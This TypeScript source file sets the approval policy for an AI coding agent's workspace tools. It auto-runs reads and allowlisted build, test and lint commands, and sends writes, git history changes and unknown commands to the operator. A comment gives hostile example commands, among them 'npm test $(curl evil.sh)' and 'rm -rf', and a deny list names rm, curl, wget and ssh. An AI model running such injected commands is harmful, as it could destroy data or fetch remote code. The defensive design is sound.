/**
 * Workspace execution policy (Phase E) — tiered auto-approve.
 *
 * pilot-api now delegates repo/git tools to this machine. THIS file decides what runs
 * without asking, what needs a click, and what is never silently allowed. It is the
 * security boundary the operator actually feels, so it is pure, exhaustively tested, and
 * deliberately paranoid.
 *
 * The tiers (operator's choice):
 *   READ     — auto. Reading a file cannot hurt you.
 *   WRITE    — the existing Phase C diff-approve gate. Nothing lands on disk unreviewed.
 *   SHELL    — an allowlist of build/test/lint/read-only-git commands runs automatically;
 *              ANYTHING else asks.
 *   DANGER   — always asks, no exceptions, never auto.
 *
 * Design stance: the allowlist is a *whitelist of shapes*, not a blacklist of horrors.
 * A blacklist loses — `rm` is obvious, `find . -delete` is not, `npm run deploy` is a
 * shell escape hatch wearing a build tool's clothes. So auto-approval requires:
 *   (a) the command's head is on the allowlist, AND
 *   (b) it contains NO shell metacharacter that could chain, redirect or substitute.
 * Everything else falls through to the operator. Falling through is cheap; being wrong is not.
 */

export type Tier = "read" | "write" | "shell" | "danger";
export type Verdict = "auto" | "ask" | "deny";

export interface PolicyDecision {
  verdict: Verdict;
  tier: Tier;
  /** Shown to the operator on the approval prompt. Must explain the RISK, not the tool. */
  reason: string;
}

/* ── Tiers ──────────────────────────────────────────────────────────────────────── */

/* Names come from pilot-api's handler registry. There is no git.status/git.diff — that is
 * repo.status/repo.diff — and getting this wrong means a tool silently falls through to
 * the "unknown => ask" branch and the assistant looks broken. */
const READ_TOOLS = new Set([
  "repo.readFile", "repo.listFiles", "repo.listDir", "repo.search", "repo.symbols",
  "repo.references", "repo.deps", "repo.impact", "repo.status", "repo.diff",
  "repo.getErrors", "repo.getPatch", "repo.testCoverage", "repo.codeHealth",
  "git.blame", "git.history", "git.diffStats",
]);

const WRITE_TOOLS = new Set([
  "repo.createFile", "repo.updateFile", "repo.multiReplace", "repo.applyPatch",
  "repo.format", "repo.rollback", "repo.autoFix",
]);

/** Always asks. These rewrite history or leave the machine. */
const DANGER_TOOLS = new Set(["git.commit", "git.createBranch", "git.push"]);

/** Runs a command. `repo.runTests` means "run this project's tests". */
const SHELL_TOOLS = new Set(["repo.run", "repo.runTests"]);

/* ── Shell ──────────────────────────────────────────────────────────────────────── */

/**
 * Metacharacters that let one command become several, redirect into a file, or
 * substitute another command's output. If ANY of these appear, the command cannot be
 * reasoned about from its head alone, so it is never auto-approved.
 *
 *   npm test && rm -rf .        <- `&&`
 *   npm test > /etc/passwd      <- `>`
 *   npm test $(curl evil.sh)    <- `$(`
 *   npm test `whoami`           <- backtick
 */
const SHELL_METACHARACTERS = /[;&|`$><\n\r]|\$\(/;

/**
 * Command shapes that are safe to run unattended: build, typecheck, test, lint, and
 * read-only git. Matched against the NORMALISED head of the command.
 *
 * Note what is NOT here: `npm run <anything>` and `npm install`. A package script is an
 * arbitrary shell command chosen by whoever wrote package.json — `npm run deploy` would
 * sail straight through. Only the specific script names below are recognised.
 */
const SHELL_ALLOWLIST: RegExp[] = [
  // test / typecheck / lint / format-check
  /^npm (run )?(test|typecheck|lint|build)$/,
  /^npm (run )?(test|typecheck|lint)( --)?( --run)?$/,
  /^npm ci --dry-run$/,
  /^(npx |pnpm |yarn )?(vitest|jest) run$/,
  /^(npx |pnpm |yarn )?(vitest|jest)( run)? [\w./@-]+$/,     // a single test path
  /^(npx )?tsc --noEmit( --pretty false)?$/,
  /^(npx )?eslint [\w./@*-]+$/,
  /^(npx )?prettier --check [\w./@*-]+$/,
  // read-only git
  /^git (status|diff|log|branch|show|remote -v)( [\w./@~^-]+)*$/,
  /^git diff --(stat|cached|name-only)( [\w./@~^-]+)*$/,
  // harmless introspection
  /^(node|npm|npx|git|tsc) --version$/,
  /^(ls|pwd)( [\w./@-]+)?$/,
  /^cat package\.json$/,
];

/** Commands that must NEVER run unattended, even if a future allowlist entry matched. */
const SHELL_ALWAYS_ASK: RegExp[] = [
  /\brm\b/, /\bsudo\b/, /\bchmod\b/, /\bchown\b/, /\bdd\b/, /\bmkfs\b/, /\bshutdown\b/,
  /\bcurl\b/, /\bwget\b/, /\bssh\b/, /\bscp\b/, /\bdocker\b/, /\bkubectl\b/,
  /\bgit\s+(push|reset|clean|checkout|rebase|filter-branch)\b/,
  /\bnpm\s+(publish|install|i|add|uninstall)\b/, /\byarn\s+(publish|add)\b/, /\bpnpm\s+(publish|add)\b/,
  /\bdeploy\b/, /\bpublish\b/, /\brelease\b/,
  /-delete\b/, /--force\b/, /-rf\b/,
];

export function normalizeCommand(cmd: string): string {
  return (cmd || "").trim().replace(/\s+/g, " ");
}

/**
 * Recover the real command from the tool args.
 *
 * Observed live: the model calls repo.run with `{ cmd: "npm", args: ["test"] }`, not a
 * single string. Reading `cmd` alone yields "npm" — which is not on the allowlist, so a
 * perfectly ordinary `npm test` got refused and the agent stalled. Join them.
 *
 * repo.runTests carries no command at all: it means "run this project's tests".
 */
export function commandFromArgs(toolName: string, args: Record<string, unknown>): string {
  if (toolName === "repo.runTests") {
    return normalizeCommand(String(args.testCommand ?? args.cmd ?? "npm test"));
  }
  const head = String(args.cmd ?? args.command ?? "");
  const rest = Array.isArray(args.args) ? args.args.map(String) : [];
  return normalizeCommand([head, ...rest].join(" "));
}

/** Would this shell command run without asking? */
export function classifyShellCommand(rawCmd: string): PolicyDecision {
  const cmd = normalizeCommand(rawCmd);

  if (!cmd) {
    return { verdict: "deny", tier: "shell", reason: "Empty command." };
  }
  for (const re of SHELL_ALWAYS_ASK) {
    if (re.test(cmd)) {
      return {
        verdict: "ask",
        tier: "danger",
        reason: `\`${cmd}\` can modify your machine, your history, or the network. It will only run if you approve it.`,
      };
    }
  }
  if (SHELL_METACHARACTERS.test(cmd)) {
    return {
      verdict: "ask",
      tier: "shell",
      reason:
        `\`${cmd}\` chains, redirects or substitutes commands, so what it actually does cannot be ` +
        `judged from the command name alone. Approve it only if you have read it.`,
    };
  }
  if (SHELL_ALLOWLIST.some((re) => re.test(cmd))) {
    return { verdict: "auto", tier: "shell", reason: `\`${cmd}\` is a known build/test/lint command.` };
  }
  return {
    verdict: "ask",
    tier: "shell",
    reason: `\`${cmd}\` is not on the auto-run list. Approve it to let MigraPilot run it here.`,
  };
}

/* ── The decision ───────────────────────────────────────────────────────────────── */

export interface PolicyOptions {
  /** migrapilot.workspace.autoRunCommands — operator can turn the shell allowlist off entirely. */
  allowShell?: boolean;
  /** migrapilot.workspace.enabled — the master switch. */
  enabled?: boolean;
}

export function decide(
  toolName: string,
  args: Record<string, unknown>,
  opts: PolicyOptions = {},
): PolicyDecision {
  const { allowShell = true, enabled = true } = opts;

  if (!enabled) {
    return {
      verdict: "deny",
      tier: "read",
      reason: "Workspace execution is disabled (migrapilot.workspace.enabled).",
    };
  }

  if (READ_TOOLS.has(toolName)) {
    return { verdict: "auto", tier: "read", reason: "Reading your workspace." };
  }

  if (WRITE_TOOLS.has(toolName)) {
    // Writes do NOT bypass Phase C. They surface as a reviewable proposal, and the
    // existing approve-before-apply gate (fail-closed, single-use nonce) still governs
    // whether anything reaches disk.
    return {
      verdict: "ask",
      tier: "write",
      reason: `MigraPilot wants to modify ${String(args.path ?? "a file")}. You will see the diff before anything is written.`,
    };
  }

  if (DANGER_TOOLS.has(toolName)) {
    return {
      verdict: "ask",
      tier: "danger",
      reason: `${toolName} changes your repository history. It will only run if you approve it.`,
    };
  }

  if (SHELL_TOOLS.has(toolName)) {
    const cmd = commandFromArgs(toolName, args);
    const d = classifyShellCommand(cmd);
    if (d.verdict === "auto" && !allowShell) {
      return {
        verdict: "ask",
        tier: "shell",
        reason: `Auto-run is off (migrapilot.workspace.autoRunCommands). Approve to run \`${normalizeCommand(cmd)}\`.`,
      };
    }
    return d;
  }

  // Unknown tool: fail closed. A tool we have not reasoned about does not run silently.
  return {
    verdict: "ask",
    tier: "danger",
    reason: `${toolName} is not a tool MigraPilot recognises for workspace execution. Approve only if you expected this.`,
  };
}
